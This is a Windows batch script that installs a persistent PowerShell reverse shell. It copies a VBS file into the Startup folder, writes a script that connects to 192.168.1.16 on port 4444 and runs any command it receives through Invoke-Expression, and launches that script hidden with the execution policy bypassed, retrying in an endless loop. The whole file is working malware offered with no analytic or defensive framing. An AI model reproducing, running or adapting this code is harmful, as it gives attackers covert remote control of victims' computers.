@echo off
move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
:loop
set FILE=%temp%\sh.ps1
if not exist %FILE% (
    (
        echo $ip = "192.168.1.16"
        echo $port = 4444
        echo.
        echo while ^($true^) ^{
        echo      try ^{
        echo          $client = New-Object System.Net.Sockets.TcpClient^($ip, $port^)
        echo          $stream = $client.GetStream^(^)
        echo          $writer = New-Object System.IO.StreamWriter^($stream^)
        echo          $reader = New-Object System.IO.StreamReader^($stream^)
        echo.
        echo          function Execute-Command ^{  
        echo               param^([string]$cmd^)
        echo.
        echo               $output = $errorOutput = $null
        echo. 
        echo               try ^{                
        echo                    $output = Invoke-Expression -Command $cmd
        echo               ^} catch ^{ 
        echo                   $errorOutput = $_.Exception.Message
        echo               ^}
        echo.        
        echo               return $output, $errorOutput
        echo          ^}        
        echo.                
        echo          while ^($true^) ^{          
        echo              $prompt = ^(Get-Location^).Path + "> "
        echo              $writer.Write^($prompt^)
        echo              $writer.Flush^(^)          
        echo.
        echo              $command = $reader.ReadLine^(^)
        echo.
        echo              if ^($command -eq "exit"^) ^{            
        echo                  break
        echo              ^}
        echo.                   
        echo              $output, $errorOutput = Execute-Command -cmd $command
        echo.               
        echo              $writer.WriteLine^($output -join "`n"^)
        echo              $writer.WriteLine^($errorOutput^)
        echo              $writer.Flush^(^)
        echo           ^}   
        echo        ^} catch ^{
        echo.    
        echo        ^} finally ^{
        echo            $client.Close^(^)
        echo        ^}
        echo. 
        echo.    
        echo        Start-Sleep -Seconds 40
        echo    ^}    
    ) > %FILE%
) else (
   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\sh.ps1"
   timeout /t 100 >nul
)
goto loop
